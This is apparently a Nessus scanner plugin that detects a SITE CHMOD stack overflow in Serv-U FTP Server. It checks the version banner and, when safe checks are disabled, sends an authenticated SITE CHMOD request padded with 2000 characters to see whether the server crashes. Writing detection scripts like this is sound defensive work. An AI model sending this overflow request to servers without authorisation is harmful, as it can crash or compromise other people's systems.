#
# Written by Astharot <astharot@zone-h.org>
# 

if(description)
{
 script_id(12037);
 script_cve_id("CVE-2004-2111", "CVE-2004-2533");
 script_bugtraq_id(9483, 9675);
 script_version ("$Revision: 1.13 $");
 
 name["english"] = "Serv-U FTP Server SITE CHMOD Command Stack Overflow Vulnerability";
 
 script_name(english:name["english"]);
	     
 desc["english"] = "
The remote host is running Serv-U FTP server.

There is a bug in the way this server handles arguments to the SITE CHMOD
requests which may allow an attacker to trigger a buffer overflow against
this server, which may allow him to disable this server remotely or to
execute arbitrary code on this host.

See also : http://archives.neohapsis.com/archives/bugtraq/2004-01/0249.html
           http://archives.neohapsis.com/archives/fulldisclosure/2004-02/0881.html

Solution : Upgrade to Serv-U FTP Server version 4.2 or later.
Risk factor : High";
		 
		 
 script_description(english:desc["english"]);

 
 script_summary(english:"Serv-U Stack Overflow");
 script_category(ACT_MIXED_ATTACK);
 script_family(english:"FTP");
 
 
 script_copyright(english:"This script is Copyright (C) 2004 Astharot");
		  
 script_require_ports("Services/ftp", 21);
 script_dependencie("find_service.nes", "ftpserver_detect_type_nd_version.nasl", "ftp_anonymous.nasl");

 exit(0);
}

include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if(!port)port = 21;
if(!get_port_state(port))exit(0);

banner = get_ftp_banner(port:port);
if ( ! banner || "Serv-U FTP Server " >!< banner ) exit(0);

login = get_kb_item("ftp/login");
password = get_kb_item("ftp/password");
if (!login || safe_checks()) {

 data = "
The remote host is running Serv-U FTP server.

There is a bug in the way this server handles arguments to the SITE CHMOD
requests which may allow an attacker to trigger a buffer overflow against
this server, which may allow him to disable this server remotely or to
execute arbitrary code on this host.

** Nessus only check the version number in the server banner
** To really check the vulnerability, disable safe_checks

Solution : Upgrade to Serv-U Server 4.2.0 or newer
Risk factor : High";

 banner = get_ftp_banner(port:port);
 if ( ! banner ) exit(0);

 if(egrep(pattern:"Serv-U FTP Server v([0-3]|4\.[0-1])\.", string:banner))security_hole(port: port, data: data); 
 exit(0);
}


if(login)
{
 soc = open_sock_tcp(port);
 if(!soc)exit(0);
 if(ftp_authenticate(socket:soc, user:login,pass:password))
 {
 crp = crap(data:"a", length:2000);
 req = string("SITE CHMOD 0666  ", crp, "\r\n");
 send(socket:soc, data:req);
 r = recv_line(socket:soc, length:4096);
 if(!r)
 {
  security_hole(port);
  exit(0);
 }
 data = string("QUIT\r\n");
 send(socket:soc, data:data);
 }
 close(soc);
}
